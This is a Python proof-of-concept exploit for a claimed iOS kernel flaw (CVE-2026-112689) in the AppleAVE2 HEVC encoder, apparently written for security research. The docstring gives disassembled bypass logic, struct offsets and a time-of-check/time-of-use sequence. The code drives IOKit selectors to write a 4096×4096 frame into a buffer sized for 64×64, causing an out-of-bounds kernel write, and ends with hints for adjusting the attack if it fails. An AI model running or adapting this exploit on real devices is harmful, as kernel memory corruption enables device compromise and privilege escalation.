#!/usr/bin/env python3
"""
CVE-2026-112689 PoC — AVE2 HEVC PREPARE/START dimension bypass
Target: iPhone17,4 iOS 26.6.1 (23G83)
Research: personal device, authorized testing

Bypass mechanism (26.6.1):
  AVE_Client_CheckGGMInfo @ 0xfffffff00851dd2c
  Bypass @ 0x851df84:
    tbnz  w23, #0, skip       ; bit0(arg2) set → skip mismatch check
    ldr   w8, [x22, #0x2ec0]  ; Config[0x2ec0] = mode_flag
    cmp   w8, #0x1
    b.ne  skip                 ; mode_flag != 1 → bypass mismatch check!
    ldr   w8, [x21, #0x1838]  ; encoder_state prepared_width
    ldr   w9, [x22, #0xa58]   ; config current_width
    cmp   w8, w9              ; mismatch → error (normally)
  26.7.2 adds guards BEFORE this check; 26.6.1 is missing them.

Call chain (PATH B via iLAFrameCnt > 20):
  IO_Start (sel 4) → sub_8645b88 → sub_85249dc → sub_851ea24
                                    ↑ skips sub_8523fb0 (full validator)
  → sub_851e204 → AVE_Client_CheckGGMInfo → bypass @ 0x851df84

Config struct location: session_obj + 0x340
  Confirmed by: add x5, x20, #0x340 (at 0xfffffff008645fdc)
  x5 = arg5 to sub_85249dc → becomes x27 → passed as x2 to sub_851ea24
  → x22 (arg2) in sub_851e204 → arg3 to CheckGGMInfo

TOCTOU exploit:
  1. IO_Config(w=64, h=64, iLAFrameCnt=21, mode_flag=0)
  2. IO_Prepare → buffer allocated for 64×64
  3. IO_Config(w=4096, h=4096, mode_flag=0)
  4. IO_Start → PATH B (iLAFrameCnt=21 → look-ahead path)
              → CheckGGMInfo: mode_flag=0 → bypass → no mismatch check
              → encodes 4096×4096 into 64×64 buffer → OOB write

Expected result: kernel panic, panic log reveals:
  - Which kalloc zone the buffer was in
  - What adjacent object was corrupted
  - Fault PC (kernel write to OOB address)

SAFETY: Run via ResearchHost ONLY.
  CLOSE PocketCode BEFORE ResearchHost executes this job.
  Submit to queue while PocketCode is open, then close PocketCode.
"""

import ctypes
import struct
import sys

# --- IOKit / Mach setup ---
_iokit = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/IOKit.framework/IOKit")
_libc  = ctypes.cdll.LoadLibrary("/usr/lib/libSystem.B.dylib")

_iokit.IOServiceMatching.restype = ctypes.c_void_p
_iokit.IOServiceMatching.argtypes = [ctypes.c_char_p]

_iokit.IOServiceGetMatchingService.restype = ctypes.c_uint32
_iokit.IOServiceGetMatchingService.argtypes = [ctypes.c_uint32, ctypes.c_void_p]

_iokit.IOServiceOpen.restype = ctypes.c_int32
_iokit.IOServiceOpen.argtypes = [
    ctypes.c_uint32,                   # service
    ctypes.c_void_p,                   # owningTask
    ctypes.c_uint32,                   # type
    ctypes.POINTER(ctypes.c_uint32),   # connect (out)
]

_iokit.IOConnectCallStructMethod.restype = ctypes.c_int32
_iokit.IOConnectCallStructMethod.argtypes = [
    ctypes.c_uint32,                      # connect
    ctypes.c_uint32,                      # selector
    ctypes.c_void_p,                      # inputStruct
    ctypes.c_size_t,                      # inputStructCnt
    ctypes.c_void_p,                      # outputStruct
    ctypes.POINTER(ctypes.c_size_t),      # outputStructCnt
]

_iokit.IOObjectRelease.restype = ctypes.c_int32
_iokit.IOObjectRelease.argtypes = [ctypes.c_uint32]

_libc.mach_task_self_.restype = ctypes.c_void_p
_libc.mach_task_self_.argtypes = []

MACH_PORT_NULL       = 0
kIOMasterPortDefault = 0

# --- Selector indices (0-based) ---
SEL_OPEN    = 0   # IO_Open:    input=0x38,     output=0x20
SEL_CLOSE   = 1   # IO_Close:   input=0x1a0a0,  output=0x20
SEL_CONFIG  = 2   # IO_Config:  input=0x1a0b0,  output=0x150  ← large config struct
SEL_PREPARE = 3   # IO_Prepare: input=0x30,     output=0x20
SEL_START   = 4   # IO_Start:   input=0x30,     output=0x20   ← VULNERABLE PATH B

SIZE_OPEN_IN    = 0x38
SIZE_OPEN_OUT   = 0x20
SIZE_CONFIG_IN  = 0x1a0b0
SIZE_CONFIG_OUT = 0x150
SIZE_PREP_IN    = 0x30
SIZE_PREP_OUT   = 0x20
SIZE_START_IN   = 0x30
SIZE_START_OUT  = 0x20

# --- Config struct field offsets (assumed 1:1: IO_Config input[off] = config_struct[off]) ---
OFF_NOTIFY_FUNC  = 0x0028   # iNotificationFunc (must be != 0 to pass CheckParam_Config)
OFF_NOTIFY_PARAM = 0x0030   # iNotificationParam (must be != 0)
OFF_LACNT        = 0x01c8   # iLAFrameCnt — set >20 to reach PATH B (look-ahead encode path)
OFF_BFRAMES      = 0x0248   # iNumOfFrame_B — alternative PATH B trigger (set >3)
OFF_WIDTH        = 0x0a58   # frame width
OFF_HEIGHT       = 0x0a5c   # frame height
OFF_MODE_FLAG    = 0x2ec0   # bypass trigger: 0 = bypass active (!=1), 1 = safe


def struct_call(conn, sel, in_data, out_size):
    out = (ctypes.c_uint8 * out_size)()
    out_cnt = ctypes.c_size_t(out_size)
    in_arr  = (ctypes.c_uint8 * len(in_data))(*in_data)
    ret = _iokit.IOConnectCallStructMethod(
        conn, sel,
        ctypes.cast(in_arr, ctypes.c_void_p), ctypes.c_size_t(len(in_data)),
        ctypes.cast(out, ctypes.c_void_p), ctypes.byref(out_cnt),
    )
    return ret, bytes(out[:out_cnt.value])


def make_config(w, h, mode_flag=0, la_cnt=21):
    """Build IO_Config input struct (0x1a0b0 bytes).
    Defaults: mode_flag=0 (bypass armed), la_cnt=21 (>20 → PATH B).
    """
    cfg = bytearray(SIZE_CONFIG_IN)                     # zero-filled
    struct.pack_into('<Q', cfg, OFF_NOTIFY_FUNC,  1)    # non-null callback
    struct.pack_into('<Q', cfg, OFF_NOTIFY_PARAM, 1)    # non-null param
    struct.pack_into('<I', cfg, OFF_LACNT,     la_cnt)  # > 20 → look-ahead PATH B
    struct.pack_into('<I', cfg, OFF_BFRAMES,   0)
    struct.pack_into('<I', cfg, OFF_WIDTH,     w)
    struct.pack_into('<I', cfg, OFF_HEIGHT,    h)
    struct.pack_into('<I', cfg, OFF_MODE_FLAG, mode_flag)  # 0 != 1 → bypass
    return cfg


def main():
    print("[*] CVE-2026-112689 PoC — HEVC bypass (AVE2)")
    print("[*] Target: iPhone17,4 iOS 26.6.1 (23G83)")

    # Locate AppleAVE2 IOService
    matching = _iokit.IOServiceMatching(b"AppleAVE2")
    if not matching:
        print("[-] IOServiceMatching returned NULL")
        return 1

    service = _iokit.IOServiceGetMatchingService(kIOMasterPortDefault, matching)
    if service == MACH_PORT_NULL:
        print("[-] AppleAVE2 service not found")
        print("    Try: ioreg -l -c AppleAVE2")
        return 1
    print(f"[+] AppleAVE2 service:   0x{service:08x}")

    task = ctypes.c_void_p(_libc.mach_task_self_())
    conn = ctypes.c_uint32(0)
    # Try user client type 0 first
    ret = _iokit.IOServiceOpen(service, task, 0, ctypes.byref(conn))
    _iokit.IOObjectRelease(service)

    if ret != 0:
        print(f"[-] IOServiceOpen(type=0) failed: 0x{ret & 0xFFFFFFFF:08x}")
        print("    (entitlement or wrong type — check panic log for required type)")
        return 1
    print(f"[+] User client opened:  0x{conn.value:08x}")

    exit_code = 0
    try:
        # 1. IO_Open — open HEVC encode session
        open_in = bytearray(SIZE_OPEN_IN)
        ret, out = struct_call(conn.value, SEL_OPEN, open_in, SIZE_OPEN_OUT)
        print(f"[*] IO_Open  (sel=0): ret=0x{ret & 0xFFFFFFFF:08x}")
        if ret != 0:
            print("    IO_Open failed — session may not be initialized")

        # 2. IO_Config — small dims, iLAFrameCnt=21, mode_flag=0 (bypass armed)
        cfg = make_config(w=64, h=64, mode_flag=0, la_cnt=21)
        ret, _ = struct_call(conn.value, SEL_CONFIG, cfg, SIZE_CONFIG_OUT)
        print(f"[*] IO_Config(sel=2): ret=0x{ret & 0xFFFFFFFF:08x}  [w=64 h=64 la=21 flag=0]")

        # 3. IO_Prepare — allocates kernel buffer sized for 64×64
        prep_in = bytearray(SIZE_PREP_IN)
        ret, _ = struct_call(conn.value, SEL_PREPARE, prep_in, SIZE_PREP_OUT)
        print(f"[*] IO_Prepare(sel=3): ret=0x{ret & 0xFFFFFFFF:08x}  [small buffer allocated]")

        # 4. IO_Config again — upgrade to large dims (TOCTOU trigger)
        cfg2 = make_config(w=4096, h=4096, mode_flag=0, la_cnt=21)
        ret, _ = struct_call(conn.value, SEL_CONFIG, cfg2, SIZE_CONFIG_OUT)
        print(f"[*] IO_Config(sel=2): ret=0x{ret & 0xFFFFFFFF:08x}  [w=4096 h=4096 — TOCTOU!]")

        # 5. IO_Start — PATH B → CheckGGMInfo → mode_flag=0 → bypass → OOB write
        start_in = bytearray(SIZE_START_IN)
        print("[*] IO_Start (sel=4): FIRING bypass — expect kernel panic / OOB write")
        sys.stdout.flush()
        ret, _ = struct_call(conn.value, SEL_START, start_in, SIZE_START_OUT)
        print(f"[*] IO_Start returned: ret=0x{ret & 0xFFFFFFFF:08x}")
        print("[?] Returned without panic — bypass may need adjustment:")
        print("    - Verify mode_flag offset: check if config[0x2ec0] is set correctly")
        print("    - Verify iLAFrameCnt offset: may not be at input[0x1c8]")
        print("    - Try iNumOfFrame_B > 3 at input[0x248] instead")
        print("    - IO_Open fields may need valid session type to enable HEVC path")

    except Exception as e:
        print(f"[-] Exception: {e}")
        import traceback
        traceback.print_exc()
        exit_code = 1
    finally:
        _iokit.IOObjectRelease(conn.value)
        print("[*] User client closed")

    return exit_code


if __name__ == "__main__":
    sys.exit(main())
